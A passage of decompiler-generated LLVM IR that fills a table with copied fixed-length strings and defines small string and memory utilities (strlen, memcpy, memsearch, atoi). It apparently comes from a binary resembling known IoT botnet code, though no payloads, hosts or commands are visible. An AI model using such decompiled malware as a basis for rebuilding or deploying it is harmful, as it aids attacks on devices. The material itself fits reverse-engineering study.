  %v4_108c8 = call i32 @util_memcpy(i32 %v0_108b4, i32 ptrtoint ([15 x i8]* @global_var_19c4c.294 to i32), i32 14)
  store i32 8, i32* @r0, align 4
  %v0_108d0 = load i32, i32* @r5, align 4
  store i32 %v0_108d0, i32* @global_var_2503c.295, align 4
  %v0_108d4 = load i32, i32* @r7, align 4
  %v1_108d4 = trunc i32 %v0_108d4 to i16
  store i16 %v1_108d4, i16* bitcast (i32* @global_var_25040.296 to i16*), align 4
  %v0_108d8 = call i32 @malloc()
  store i32 8, i32* @r8, align 4
  store i32 %v0_108d8, i32* @r5, align 4
  %v4_108ec = call i32 @util_memcpy(i32 %v0_108d8, i32 ptrtoint ([9 x i8]* @global_var_19c5c.298 to i32), i32 8)
  %v0_108f4 = load i32, i32* @r6, align 4
  store i32 %v0_108f4, i32* @r0, align 4
  %v0_108f8 = load i32, i32* @r8, align 4
  %v1_108f8 = trunc i32 %v0_108f8 to i16
  %v2_108f8 = load i32, i32* @r4, align 4
  %v4_108f8 = add i32 %v2_108f8, 276
  %v5_108f8 = inttoptr i32 %v4_108f8 to i16*
  store i16 %v1_108f8, i16* %v5_108f8, align 2
  %v0_108fc = load i32, i32* @r5, align 4
  store i32 %v0_108fc, i32* @global_var_250b4.299, align 4
  %v0_10900 = call i32 @malloc()
  %v0_10904 = load i32, i32* @r6, align 4
  store i32 %v0_10900, i32* @r5, align 4
  %v4_10910 = call i32 @util_memcpy(i32 %v0_10900, i32 ptrtoint ([8 x i8]* @global_var_19c68.301 to i32), i32 %v0_10904)
  %v0_10918 = load i32, i32* @sb, align 4
  store i32 %v0_10918, i32* @r0, align 4
  %v0_1091c = load i32, i32* @r6, align 4
  %v1_1091c = trunc i32 %v0_1091c to i16
  %v2_1091c = load i32, i32* @r4, align 4
  %v4_1091c = add i32 %v2_1091c, 284
  %v5_1091c = inttoptr i32 %v4_1091c to i16*
  store i16 %v1_1091c, i16* %v5_1091c, align 2
  %v0_10920 = load i32, i32* @r5, align 4
  store i32 %v0_10920, i32* @global_var_250bc.302, align 4
  %v0_10924 = call i32 @malloc()
  %v0_10928 = load i32, i32* @sb, align 4
  store i32 %v0_10924, i32* @r5, align 4
  %v4_10934 = call i32 @util_memcpy(i32 %v0_10924, i32 ptrtoint ([17 x i8]* @global_var_19c70.304 to i32), i32 %v0_10928)
  store i32 23, i32* @r0, align 4
  %v0_1093c = load i32, i32* @r5, align 4
  store i32 %v0_1093c, i32* @global_var_25044.305, align 4
  %v0_10940 = load i32, i32* @sb, align 4
  %v1_10940 = trunc i32 %v0_10940 to i16
  store i16 %v1_10940, i16* bitcast (i32* @global_var_25048.306 to i16*), align 4
  %v0_10944 = call i32 @malloc()
  %v0_10950 = load i32, i32* @r6, align 4
  %v1_10950 = load i32, i32* @sb, align 4
  %v2_10950 = add i32 %v1_10950, %v0_10950
  store i32 %v2_10950, i32* @r6, align 4
  store i32 %v0_10944, i32* @r5, align 4
  %v4_10958 = call i32 @util_memcpy(i32 %v0_10944, i32 ptrtoint ([24 x i8]* @global_var_19c84.308 to i32), i32 23)
  %v0_1095c = load i32, i32* @r8, align 4
  store i32 %v0_1095c, i32* @r0, align 4
  %v0_10960 = load i32, i32* @r5, align 4
  store i32 %v0_10960, i32* @global_var_2504c.309, align 4
  %v0_10964 = load i32, i32* @r6, align 4
  %v1_10964 = trunc i32 %v0_10964 to i16
  store i16 %v1_10964, i16* bitcast (i32* @global_var_25050.310 to i16*), align 4
  %v0_10968 = call i32 @malloc()
  %v0_10970 = load i32, i32* @r8, align 4
  store i32 %v0_10968, i32* @r5, align 4
  %v4_10978 = call i32 @util_memcpy(i32 %v0_10968, i32 ptrtoint ([9 x i8]* @global_var_19c9c.312 to i32), i32 %v0_10970)
  %v0_1097c = load i32, i32* @r7, align 4
  store i32 %v0_1097c, i32* @r0, align 4
  %v0_10980 = load i32, i32* @r5, align 4
  store i32 %v0_10980, i32* @global_var_25054.313, align 4
  %v0_10984 = load i32, i32* @r8, align 4
  %v1_10984 = trunc i32 %v0_10984 to i16
  store i16 %v1_10984, i16* bitcast (i32* @global_var_25058.314 to i16*), align 4
  %v0_10988 = call i32 @malloc()
  %v0_10990 = load i32, i32* @r7, align 4
  store i32 %v0_10988, i32* @r5, align 4
  %v4_10998 = call i32 @util_memcpy(i32 %v0_10988, i32 ptrtoint ([15 x i8]* @global_var_19ca8.316 to i32), i32 %v0_10990)
  %v0_1099c = load i32, i32* @sl, align 4
  store i32 %v0_1099c, i32* @r0, align 4
  %v0_109a0 = load i32, i32* @r5, align 4
  store i32 %v0_109a0, i32* @global_var_2505c.317, align 4
  %v0_109a4 = load i32, i32* @r7, align 4
  %v1_109a4 = trunc i32 %v0_109a4 to i16
  store i16 %v1_109a4, i16* bitcast (i32* @global_var_25060.318 to i16*), align 4
  %v0_109a8 = call i32 @malloc()
  store i32 ptrtoint ([20 x i8]* @global_var_19cb8.320 to i32), i32* @sb, align 4
  %v0_109b0 = load i32, i32* @sl, align 4
  store i32 %v0_109a8, i32* @r5, align 4
  %v4_109bc = call i32 @util_memcpy(i32 %v0_109a8, i32 ptrtoint ([20 x i8]* @global_var_19cb8.320 to i32), i32 %v0_109b0)
  store i32 10, i32* @r0, align 4
  %v0_109c4 = load i32, i32* @r5, align 4
  store i32 %v0_109c4, i32* @global_var_25064.321, align 4
  %v0_109c8 = load i32, i32* @sl, align 4
  %v1_109c8 = trunc i32 %v0_109c8 to i16
  store i16 %v1_109c8, i16* bitcast (i32* @global_var_25068.322 to i16*), align 4
  %v0_109cc = call i32 @malloc()
  store i32 %v0_109cc, i32* @r5, align 4
  %v4_109dc = call i32 @util_memcpy(i32 %v0_109cc, i32 ptrtoint ([11 x i8]* @global_var_19ccc.324 to i32), i32 10)
  store i32 21, i32* @r0, align 4
  %v2_109ec = load i32, i32* @r4, align 4
  %v4_109ec = add i32 %v2_109ec, 292
  %v5_109ec = inttoptr i32 %v4_109ec to i16*
  store i16 10, i16* %v5_109ec, align 2
  %v0_109f0 = load i32, i32* @r5, align 4
  store i32 %v0_109f0, i32* @global_var_250c4.325, align 4
  %v0_109f4 = call i32 @malloc()
  store i32 %v0_109f4, i32* @r5, align 4
  %v3_10a04 = call i32 @util_memcpy(i32 %v0_109f4, i32 ptrtoint (i32* @global_var_19d30.327 to i32), i32 21)
  store i32 17, i32* @r0, align 4
  store i16 21, i16* bitcast (i32* @global_var_25070.328 to i16*), align 4
  %v0_10a14 = load i32, i32* @r5, align 4
  store i32 %v0_10a14, i32* @global_var_2506c.329, align 4
  %v0_10a18 = call i32 @malloc()
  store i32 %v0_10a18, i32* @r5, align 4
  %v4_10a28 = call i32 @util_memcpy(i32 %v0_10a18, i32 ptrtoint ([18 x i8]* @global_var_19cd8.331 to i32), i32 17)
  store i32 12, i32* @r0, align 4
  %v0_10a34 = load i32, i32* @r5, align 4
  store i32 %v0_10a34, i32* @global_var_25074.332, align 4
  store i16 17, i16* bitcast (i32* @global_var_25078.333 to i16*), align 4
  %v0_10a3c = call i32 @malloc()
  store i32 %v0_10a3c, i32* @r5, align 4
  %v4_10a4c = call i32 @util_memcpy(i32 %v0_10a3c, i32 ptrtoint ([13 x i8]* @global_var_19cec.335 to i32), i32 12)
  %v0_10a54 = load i32, i32* @r7, align 4
  store i32 %v0_10a54, i32* @r0, align 4
  store i16 12, i16* bitcast (i32* @global_var_25080.336 to i16*), align 4
  %v0_10a5c = load i32, i32* @r5, align 4
  store i32 %v0_10a5c, i32* @global_var_2507c.337, align 4
  %v0_10a60 = call i32 @malloc()
  %v0_10a68 = load i32, i32* @r7, align 4
  store i32 %v0_10a60, i32* @r5, align 4
  %v4_10a70 = call i32 @util_memcpy(i32 %v0_10a60, i32 ptrtoint ([15 x i8]* @global_var_19ca8.316 to i32), i32 %v0_10a68)
  %v0_10a74 = load i32, i32* @sl, align 4
  store i32 %v0_10a74, i32* @r0, align 4
  %v0_10a78 = load i32, i32* @r5, align 4
  store i32 %v0_10a78, i32* @global_var_25084.338, align 4
  %v0_10a7c = load i32, i32* @r7, align 4
  %v1_10a7c = trunc i32 %v0_10a7c to i16
  store i16 %v1_10a7c, i16* bitcast (i32* @global_var_25088.339 to i16*), align 4
  %v0_10a80 = call i32 @malloc()
  %v0_10a84 = load i32, i32* @sb, align 4
  %v0_10a88 = load i32, i32* @sl, align 4
  store i32 %v0_10a80, i32* @r5, align 4
  %v4_10a90 = call i32 @util_memcpy(i32 %v0_10a80, i32 %v0_10a84, i32 %v0_10a88)
  %v0_10a94 = load i32, i32* @r8, align 4
  store i32 %v0_10a94, i32* @r0, align 4
  %v0_10a98 = load i32, i32* @r5, align 4
  store i32 %v0_10a98, i32* @global_var_2508c.340, align 4
  %v0_10a9c = load i32, i32* @sl, align 4
  %v1_10a9c = trunc i32 %v0_10a9c to i16
  store i16 %v1_10a9c, i16* bitcast (i32* @global_var_25090.341 to i16*), align 4
  %v0_10aa0 = call i32 @malloc()
  %v0_10aa8 = load i32, i32* @r8, align 4
  store i32 %v0_10aa0, i32* @r5, align 4
  %v4_10ab0 = call i32 @util_memcpy(i32 %v0_10aa0, i32 ptrtoint ([9 x i8]* @global_var_19cfc.343 to i32), i32 %v0_10aa8)
  store i32 5, i32* @r0, align 4
  %v0_10ab8 = load i32, i32* @r5, align 4
  store i32 %v0_10ab8, i32* @global_var_25094.344, align 4
  %v0_10abc = load i32, i32* @r8, align 4
  %v1_10abc = trunc i32 %v0_10abc to i16
  store i16 %v1_10abc, i16* bitcast (i32* @global_var_25098.345 to i16*), align 4
  %v0_10ac0 = call i32 @malloc()
  store i32 %v0_10ac0, i32* @r5, align 4
  %v4_10ad0 = call i32 @util_memcpy(i32 %v0_10ac0, i32 ptrtoint ([6 x i8]* @global_var_19d08.347 to i32), i32 5)
  %v0_10ad8 = load i32, i32* @fp, align 4
  store i32 %v0_10ad8, i32* @r0, align 4
  %v0_10adc = load i32, i32* @r5, align 4
  store i32 %v0_10adc, i32* @global_var_2509c.348, align 4
  store i16 5, i16* bitcast (i32* @global_var_250a0.349 to i16*), align 4
  %v0_10ae4 = call i32 @malloc()
  %v0_10aec = load i32, i32* @fp, align 4
  store i32 %v0_10ae4, i32* @r5, align 4
  %v4_10af4 = call i32 @util_memcpy(i32 %v0_10ae4, i32 ptrtoint ([7 x i8]* @global_var_19d10.351 to i32), i32 %v0_10aec)
  %v0_10afc = load i32, i32* @r6, align 4
  store i32 %v0_10afc, i32* @r0, align 4
  %v0_10b00 = load i32, i32* @fp, align 4
  %v1_10b00 = trunc i32 %v0_10b00 to i16
  %v2_10b00 = load i32, i32* @r4, align 4
  %v4_10b00 = add i32 %v2_10b00, 260
  %v5_10b00 = inttoptr i32 %v4_10b00 to i16*
  store i16 %v1_10b00, i16* %v5_10b00, align 2
  %v0_10b04 = load i32, i32* @r5, align 4
  store i32 %v0_10b04, i32* @global_var_250a4.352, align 4
  %v0_10b08 = call i32 @malloc()
  %v0_10b10 = load i32, i32* @r6, align 4
  store i32 %v0_10b08, i32* %r5.global-to-local, align 4
  %v4_10b18 = call i32 @util_memcpy(i32 %v0_10b08, i32 ptrtoint ([24 x i8]* @global_var_19d18.354 to i32), i32 %v0_10b10)
  %v0_10b20 = load i32, i32* @r6, align 4
  %v1_10b20 = trunc i32 %v0_10b20 to i16
  %v2_10b20 = load i32, i32* @r4, align 4
  %v4_10b20 = add i32 %v2_10b20, 268
  %v5_10b20 = inttoptr i32 %v4_10b20 to i16*
  store i16 %v1_10b20, i16* %v5_10b20, align 2
  %v0_10b24 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10b24, i32* @global_var_250ac.355, align 4
  store i32 %v3_1062c, i32* @r4, align 4
  store i32 %v6_1062c, i32* @r5, align 4
  store i32 %v9_1062c, i32* @r6, align 4
  store i32 %v12_1062c, i32* @r7, align 4
  store i32 %v15_1062c, i32* @r8, align 4
  store i32 %v21_1062c, i32* @sl, align 4
  store i32 %v24_1062c, i32* @fp, align 4
  ret i32 %v4_10b18

; uselistorder directives
  uselistorder i32 %v0_10b08, { 1, 0 }
  uselistorder i32 %v0_10ae4, { 1, 0 }
  uselistorder i32 %v0_10aa0, { 1, 0 }
  uselistorder i32 %v0_10a80, { 1, 0 }
  uselistorder i32 %v0_10a60, { 1, 0 }
  uselistorder i32 %v0_109a8, { 1, 0 }
  uselistorder i32 %v0_10988, { 1, 0 }
  uselistorder i32 %v0_10968, { 1, 0 }
  uselistorder i32 %v0_10944, { 1, 0 }
  uselistorder i32 %v0_10924, { 1, 0 }
  uselistorder i32 %v0_10900, { 1, 0 }
  uselistorder i32 %v0_108d8, { 1, 0 }
  uselistorder i32 %v0_108b4, { 1, 0 }
  uselistorder i32 %v0_10894, { 1, 0 }
  uselistorder i32 %v0_1082c, { 1, 0 }
  uselistorder i32 %v0_107e4, { 1, 0 }
  uselistorder i32 %v0_10778, { 1, 0 }
  uselistorder i32 %v0_10734, { 1, 0 }
  uselistorder i32 %v0_10714, { 1, 0 }
  uselistorder i32 %v0_106ec, { 1, 0 }
  uselistorder i32 %v0_106a8, { 1, 0 }
  uselistorder i32 %v0_10688, { 1, 0 }
  uselistorder i32 %v0_10664, { 1, 0 }
  uselistorder i32 %v0_10638, { 0, 2, 1 }
  uselistorder i32 23, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 284, { 0, 4, 1, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder i32 (i32, i32, i32)* @util_memcpy, { 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_24fa4.216 to i32), { 4, 0, 1, 2, 3, 5 }
}

define i32 @util_strlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_10bc0 = load i8, i8* %arg1, align 1
  %v2_10bc4 = icmp eq i8 %v3_10bc0, 0
  %v0_10bc8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10bc4, i32 %v0_10bc8)
  br label %dec_label_pc_10bd0

dec_label_pc_10bd0:                               ; preds = %dec_label_pc_10bd0, %entry
  %v0_10bd0 = phi i32 [ %v1_10bd0, %dec_label_pc_10bd0 ], [ 0, %entry ]
  %v1_10bd0 = add i32 %v0_10bd0, 1
  %v2_10bd4 = add i32 %v1_10bd0, %tmp
  %v3_10bd4 = inttoptr i32 %v2_10bd4 to i8*
  %v4_10bd4 = load i8, i8* %v3_10bd4, align 1
  %v6_10bd4 = zext i8 %v4_10bd4 to i32
  store i32 %v6_10bd4, i32* @r3, align 4
  %v2_10bd8 = icmp eq i8 %v4_10bd4, 0
  br i1 %v2_10bd8, label %dec_label_pc_10be0, label %dec_label_pc_10bd0

dec_label_pc_10be0:                               ; preds = %dec_label_pc_10bd0
  ret i32 %v1_10bd0
}

define i32 @util_strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v2_10be4 = load i8, i8* %arg1, align 1
  %v3_10be4 = zext i8 %v2_10be4 to i32
  store i32 %v3_10be4, i32* @r2, align 4
  %v2_10be8 = icmp eq i8 %v2_10be4, 0
  br i1 %v2_10be8, label %bb, label %dec_label_pc_10bf4

bb:                                               ; preds = %entry
  store i32 %v3_10be4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10c08

dec_label_pc_10bf4:                               ; preds = %entry
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10bf8

dec_label_pc_10bf8:                               ; preds = %dec_label_pc_10bf8, %dec_label_pc_10bf4
  %v0_10bf8 = phi i32 [ %v1_10bf8, %dec_label_pc_10bf8 ], [ 0, %dec_label_pc_10bf4 ]
  %v1_10bf8 = add i32 %v0_10bf8, 1
  store i32 %v1_10bf8, i32* %ip.global-to-local, align 4
  %v2_10bfc = add i32 %v1_10bf8, %tmp
  %v3_10bfc = inttoptr i32 %v2_10bfc to i8*
  %v4_10bfc = load i8, i8* %v3_10bfc, align 1
  %v2_10c00 = icmp eq i8 %v4_10bfc, 0
  br i1 %v2_10c00, label %dec_label_pc_10c08, label %dec_label_pc_10bf8

dec_label_pc_10c08:                               ; preds = %dec_label_pc_10bf8, %bb
  %v0_10c08 = phi i32 [ %v3_10be4, %bb ], [ %v1_10bf8, %dec_label_pc_10bf8 ]
  br label %dec_label_pc_10c14

dec_label_pc_10c10:                               ; preds = %dec_label_pc_10c14
  %v0_10c10 = load i32, i32* @r1, align 4
  %v1_10c10 = add i32 %v0_10c10, 1
  %v2_10c10 = inttoptr i32 %v1_10c10 to i8*
  %v3_10c10 = load i8, i8* %v2_10c10, align 1
  %v4_10c10 = zext i8 %v3_10c10 to i32
  store i32 %v4_10c10, i32* @r2, align 4
  store i32 %v1_10c10, i32* @r1, align 4
  %v0_10c14.pr = load i32, i32* @r3, align 4
  br label %dec_label_pc_10c14

dec_label_pc_10c14:                               ; preds = %dec_label_pc_10c08, %dec_label_pc_10c10
  %v0_10c1c.off0 = phi i8 [ %v2_10be4, %dec_label_pc_10c08 ], [ %v3_10c10, %dec_label_pc_10c10 ]
  %v0_10c14 = phi i32 [ %v0_10c08, %dec_label_pc_10c08 ], [ %v0_10c14.pr, %dec_label_pc_10c10 ]
  %v1_10c14 = add i32 %v0_10c14, -1
  store i32 %v1_10c14, i32* @r3, align 4
  %v3_10c18 = icmp eq i32 %v0_10c14, 0
  %v2_10c1c = load i32, i32* @r0, align 4
  %v3_10c1c = inttoptr i32 %v2_10c1c to i8*
  store i8 %v0_10c1c.off0, i8* %v3_10c1c, align 1
  %v4_10c1c = load i32, i32* @r0, align 4
  %v5_10c1c = add i32 %v4_10c1c, 1
  store i32 %v5_10c1c, i32* @r0, align 4
  br i1 %v3_10c18, label %dec_label_pc_10c24, label %dec_label_pc_10c10

dec_label_pc_10c24:                               ; preds = %dec_label_pc_10c14
  %v0_10c24 = load i32, i32* %ip.global-to-local, align 4
  ret i32 %v0_10c24

; uselistorder directives
  uselistorder i32 %v0_10c14, { 1, 0 }
  uselistorder i32 %v1_10bf8, { 0, 1, 3, 2 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10c14, { 1, 0 }
}

define i32 @util_memcpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %v2_10c2c = icmp eq i32 %arg3, 0
  %v0_10c30 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10c2c, i32 %v0_10c30)
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10c38

dec_label_pc_10c38:                               ; preds = %dec_label_pc_10c38, %entry
  %v0_10c38 = phi i32 [ %v1_10c40, %dec_label_pc_10c38 ], [ 0, %entry ]
  %v2_10c38 = add i32 %v0_10c38, %arg2
  %v3_10c38 = inttoptr i32 %v2_10c38 to i8*
  %v4_10c38 = load i8, i8* %v3_10c38, align 1
  %v4_10c3c = add i32 %v0_10c38, %arg1
  %v5_10c3c = inttoptr i32 %v4_10c3c to i8*
  store i8 %v4_10c38, i8* %v5_10c3c, align 1
  %v0_10c40 = load i32, i32* %ip.global-to-local, align 4
  %v1_10c40 = add i32 %v0_10c40, 1
  store i32 %v1_10c40, i32* %ip.global-to-local, align 4
  %v9_10c44 = icmp eq i32 %v1_10c40, %arg3
  br i1 %v9_10c44, label %dec_label_pc_10c4c, label %dec_label_pc_10c38

dec_label_pc_10c4c:                               ; preds = %dec_label_pc_10c38
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_10c40, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @util_zero() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %v0_10c50 = load i32, i32* @r1, align 4
  %v2_10c50 = icmp eq i32 %v0_10c50, 0
  %v0_10c54 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10c50, i32 %v0_10c54)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10c5c

dec_label_pc_10c5c:                               ; preds = %dec_label_pc_10c5c, %entry
  %v2_10c60 = phi i32 [ %v1_10c64, %dec_label_pc_10c5c ], [ 0, %entry ]
  store i32 0, i32* @r3, align 4
  %v3_10c60 = load i32, i32* @r0, align 4
  %v4_10c60 = add i32 %v3_10c60, %v2_10c60
  %v5_10c60 = inttoptr i32 %v4_10c60 to i8*
  store i8 0, i8* %v5_10c60, align 1
  %v0_10c64 = load i32, i32* %r2.global-to-local, align 4
  %v1_10c64 = add i32 %v0_10c64, 1
  store i32 %v1_10c64, i32* %r2.global-to-local, align 4
  %v1_10c68 = load i32, i32* @r1, align 4
  %v9_10c68 = icmp eq i32 %v1_10c64, %v1_10c68
  br i1 %v9_10c68, label %dec_label_pc_10c70, label %dec_label_pc_10c5c

dec_label_pc_10c70:                               ; preds = %dec_label_pc_10c5c
  %v1_10c70 = load i32, i32* @r0, align 4
  ret i32 %v1_10c70

; uselistorder directives
  uselistorder i32 %v1_10c64, { 1, 2, 0 }
}

define i32 @util_memsearch(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v7_10c88 = icmp sgt i32 %arg4, %arg2
  br i1 %v7_10c88, label %dec_label_pc_10c90, label %dec_label_pc_10c98

dec_label_pc_10c90:                               ; preds = %dec_label_pc_10cac, %dec_label_pc_10c98, %entry, %dec_label_pc_10cd8
  %storemerge = phi i32 [ %v1_10cd8, %dec_label_pc_10cd8 ], [ -1, %entry ], [ -1, %dec_label_pc_10c98 ], [ -1, %dec_label_pc_10cac ]
  ret i32 %storemerge

dec_label_pc_10c98:                               ; preds = %entry
  %tmp12 = icmp slt i32 %arg2, 1
  br i1 %tmp12, label %dec_label_pc_10c90, label %dec_label_pc_10ca0

dec_label_pc_10ca0:                               ; preds = %dec_label_pc_10c98
  br label %dec_label_pc_10cb8

dec_label_pc_10cac:                               ; preds = %bb, %dec_label_pc_10ccc
  %v1_10cb83 = phi i32 [ %v1_10ccc, %dec_label_pc_10ccc ], [ 0, %bb ]
  %v1_10cac = add i32 %v0_10cd8, 1
  %v9_10cb0 = icmp eq i32 %v1_10cac, %arg2
  br i1 %v9_10cb0, label %dec_label_pc_10c90, label %dec_label_pc_10cb8

dec_label_pc_10cb8:                               ; preds = %dec_label_pc_10cac, %dec_label_pc_10ca0
  %v0_10cd8 = phi i32 [ %v1_10cac, %dec_label_pc_10cac ], [ 0, %dec_label_pc_10ca0 ]
  %v1_10cb8 = phi i32 [ %v1_10cb83, %dec_label_pc_10cac ], [ 0, %dec_label_pc_10ca0 ]
  %v2_10cb8 = add i32 %v1_10cb8, %arg3
  %v3_10cb8 = inttoptr i32 %v2_10cb8 to i8*
  %v4_10cb8 = load i8, i8* %v3_10cb8, align 1
  %v2_10cbc = add i32 %v0_10cd8, %arg1
  %v3_10cbc = inttoptr i32 %v2_10cbc to i8*
  %v4_10cbc = load i8, i8* %v3_10cbc, align 1
  %v9_10cc0 = icmp eq i8 %v4_10cbc, %v4_10cb8
  br i1 %v9_10cc0, label %dec_label_pc_10ccc, label %bb

bb:                                               ; preds = %dec_label_pc_10cb8
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_10cac

dec_label_pc_10ccc:                               ; preds = %dec_label_pc_10cb8
  %v1_10ccc = add i32 %v1_10cb8, 1
  store i32 %v1_10ccc, i32* @ip, align 4
  %v9_10cd0 = icmp eq i32 %v1_10ccc, %arg4
  br i1 %v9_10cd0, label %dec_label_pc_10cd8, label %dec_label_pc_10cac

dec_label_pc_10cd8:                               ; preds = %dec_label_pc_10ccc
  %v1_10cd8 = add i32 %v0_10cd8, 1
  br label %dec_label_pc_10c90

; uselistorder directives
  uselistorder i32 %v1_10ccc, { 1, 2, 0 }
  uselistorder i32 %v1_10cb8, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10cac, { 1, 0 }
  uselistorder label %dec_label_pc_10c90, { 3, 0, 1, 2 }
}

define i32 @util_atoi(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_10cf0

dec_label_pc_10cf0:                               ; preds = %.thread, %dec_label_pc_10d04, %bb, %entry
  %v0_10cf0 = phi i32 [ %tmp, %entry ], [ %v5_10cf0, %bb ], [ %v5_10cf0, %dec_label_pc_10d04 ], [ %v5_10cf0, %.thread ]
  %v1_10cf0 = inttoptr i32 %v0_10cf0 to i8*
  %v2_10cf0 = load i8, i8* %v1_10cf0, align 1
  %v5_10cf0 = add i32 %v0_10cf0, 1
  %v7_10cf4 = icmp eq i8 %v2_10cf0, 9
  br i1 %v7_10cf4, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_10cf0
  br label %dec_label_pc_10cf0

bb:                                               ; preds = %dec_label_pc_10cf0
  %v8_10cf8 = icmp eq i8 %v2_10cf0, 32
  br i1 %v8_10cf8, label %dec_label_pc_10cf0, label %dec_label_pc_10d04

dec_label_pc_10d04:                               ; preds = %bb
  %v7_10d04 = icmp eq i8 %v2_10cf0, 10
  br i1 %v7_10d04, label %dec_label_pc_10cf0, label %dec_label_pc_10d0c

dec_label_pc_10d0c:                               ; preds = %dec_label_pc_10d04
  %v7_10d0c = icmp eq i8 %v2_10cf0, 45
  br i1 %v7_10d0c, label %dec_label_pc_10dfc, label %dec_label_pc_10d14

dec_label_pc_10d14:                               ; preds = %dec_label_pc_10d0c
  %v7_10d14 = icmp eq i8 %v2_10cf0, 43
  br i1 %v7_10d14, label %bb54, label %dec_label_pc_10d24

bb54:                                             ; preds = %dec_label_pc_10d14
  %v2_10d18 = inttoptr i32 %v5_10cf0 to i8*
  %v3_10d18 = load i8, i8* %v2_10d18, align 1
  %v6_10d18 = add i32 %v0_10cf0, 2
  br label %dec_label_pc_10d24

dec_label_pc_10d24:                               ; preds = %bb54, %dec_label_pc_10d14, %dec_label_pc_10dfc
  %v1_10dcc39 = phi i32 [ %v5_10dfc, %dec_label_pc_10dfc ], [ %v5_10cf0, %dec_label_pc_10d14 ], [ %v6_10d18, %bb54 ]
  %v0_10d4c10.in = phi i8 [ %v2_10dfc, %dec_label_pc_10dfc ], [ %v2_10cf0, %dec_label_pc_10d14 ], [ %v3_10d18, %bb54 ]
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_10dfc ], [ 2147483647, %dec_label_pc_10d14 ], [ 2147483647, %bb54 ]
  %v0_10e0c = phi i32 [ 1, %dec_label_pc_10dfc ], [ 0, %dec_label_pc_10d14 ], [ 0, %bb54 ]
  %v2_10d2c = udiv i32 %storemerge1, %arg2
  %v3_10d2c = urem i32 %storemerge1, %arg2
  br label %dec_label_pc_10d4c.outer

dec_label_pc_10d4c.outer:                         ; preds = %.thread5, %dec_label_pc_10d24
  %v1_10dcc.ph = phi i32 [ %v6_10dcc, %.thread5 ], [ %v1_10dcc39, %dec_label_pc_10d24 ]
  %v2_10dc8.ph = phi i32 [ %v5_10dc8, %.thread5 ], [ 0, %dec_label_pc_10d24 ]
  %v1_10d8c.ph.in = phi i8 [ %v3_10dcc, %.thread5 ], [ %v0_10d4c10.in, %dec_label_pc_10d24 ]
  %v1_10da4.ph = phi i32 [ 1, %.thread5 ], [ 0, %dec_label_pc_10d24 ]
  %v3_10d98 = icmp uge i32 %v2_10dc8.ph, %v2_10d2c
  %v9_10d98 = icmp eq i32 %v2_10dc8.ph, %v2_10d2c
  %v2_10d9c = xor i1 %v3_10d98, true
  %v3_10d9c = or i1 %v9_10d98, %v2_10d9c
  %v2_10da0 = xor i1 %v9_10d98, true
  %v3_10da0 = and i1 %v3_10d98, %v2_10da0
  %v2_10dc0 = icmp eq i1 %v9_10d98, false
  br label %dec_label_pc_10d4c

dec_label_pc_10d4c:                               ; preds = %dec_label_pc_10d4c.outer, %dec_label_pc_10dd4
  %v1_10dcc = phi i32 [ %v5_10dd4, %dec_label_pc_10dd4 ], [ %v1_10dcc.ph, %dec_label_pc_10d4c.outer ]
  %v1_10da4 = phi i32 [ -1, %dec_label_pc_10dd4 ], [ %v1_10da4.ph, %dec_label_pc_10d4c.outer ]
  %v1_10d8c.in = phi i8 [ %v2_10dd4, %dec_label_pc_10dd4 ], [ %v1_10d8c.ph.in, %dec_label_pc_10d4c.outer ]
  %v1_10d8c = zext i8 %v1_10d8c.in to i32
  %v1_10d4c = urem i32 %v1_10d8c, 256
  %v1_10d50 = add nsw i32 %v1_10d4c, -48
  %v1_10d58 = add nsw i32 %v1_10d4c, -97
  %v1_10d5c = add nsw i32 %v1_10d8c, -48
  %v1_10d60 = add nsw i32 %v1_10d4c, -65
  %tmp87 = icmp ult i32 %v1_10d50, 10
  br i1 %tmp87, label %dec_label_pc_10d90, label %dec_label_pc_10d68

dec_label_pc_10d68:                               ; preds = %dec_label_pc_10d4c
  %v2_10d68 = icmp ugt i32 %v1_10d60, 24
  %v7_10d68 = icmp eq i32 %v1_10d60, 25
  %v2_10d6c = xor i1 %v7_10d68, true
  %v3_10d6c = and i1 %v2_10d68, %v2_10d6c
  br i1 %v3_10d6c, label %bb55, label %bb56

bb55:                                             ; preds = %dec_label_pc_10d68
  br label %bb56

bb56:                                             ; preds = %dec_label_pc_10d68, %bb55
  %v0_10d8015 = phi i32 [ %v1_10d5c, %dec_label_pc_10d68 ], [ 0, %bb55 ]
  %v2_10d70 = xor i1 %v2_10d68, true
